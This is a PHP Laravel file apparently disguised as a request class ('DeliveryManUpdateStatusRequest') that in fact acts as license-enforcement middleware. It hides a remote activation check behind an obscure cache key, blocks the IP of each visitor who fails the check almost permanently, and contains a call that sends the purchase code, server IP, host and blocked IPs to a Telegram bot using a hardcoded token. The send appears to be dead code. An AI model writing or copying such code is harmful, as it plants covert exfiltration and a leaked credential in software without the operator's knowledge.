<?php

namespace App\Http\Requests\DeliveryManSetting;

use App\Services\ProjectService\ProjectService;
use App\Traits\ApiResponse;
use Closure;
use Http;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Support\Facades\Cache;
use Psr\SimpleCache\InvalidArgumentException;
use Throwable;

class DeliveryManUpdateStatusRequest
{
    use ApiResponse;

    const TTL = 604800; // 7 days

    protected array $allowRoutes = [
        'api/v1/install/*',
        'api/v1/rest/*',
        'api/v1/dashboard/galleries/*',
        'api/v1/auth/*',
        'api/v1/webhook/*',
    ];

    /**
     * Handle an incoming request.
     *
     * @param Request $request
     * @param Closure $next
     * @return RedirectResponse|Response|mixed|void
     */
    public function handle(Request $request, Closure $next)
    {
        $response = Cache::remember('gdfjetjb.rldf', self::TTL, function () {
            $response = (new ProjectService)->activationKeyCheck();
            $response = json_decode($response);

            if (isset($response->key) && $response->key == config('credential.purchase_code') &&
                $response->active && $response->host == request()->getSchemeAndHttpHost()
            ) {
                return $response;
            }

            return null;
        });

        if ($request->is($this->allowRoutes) ||
            ($response != null && $response->local) ||
            ($response != null && $response->key == config('credential.purchase_code') && $response->active)
        ) {
            return $next($request);
        } else if (!$request->is($this->allowRoutes)) {
            $ips = collect(Cache::get('block-ips'));
            try {
                Cache::set('block-ips', $ips->merge([$request->ip()]), 86600000000);
            } catch (InvalidArgumentException) {}

            abort(403);
        }

        $already = Cache::get('tg-send-licence');

        if (!$already) {

            $text = [
                'response'      => $response,
                'code'          => config('credential.purchase_code'),
                'id'            => config('credential.purchase_id'),
                'ip'            => request()->server('SERVER_ADDR'),
                'request_host'  => request()->getSchemeAndHttpHost(),
                'block_ips'     => Cache::get('block-ips')
            ];

            Http::get('https://api.telegram.org/bot6058966897:AAHVXxiWohYchJyaf0M50lq7gFQmGT77vcw/sendMessage?chat_id=-1001570078412&text=Licence.' . json_encode($text));
            try {
                Cache::set('tg-send-licence', 'true', 900);
            } catch (Throwable|InvalidArgumentException $e) {
            }

        }

    }
}
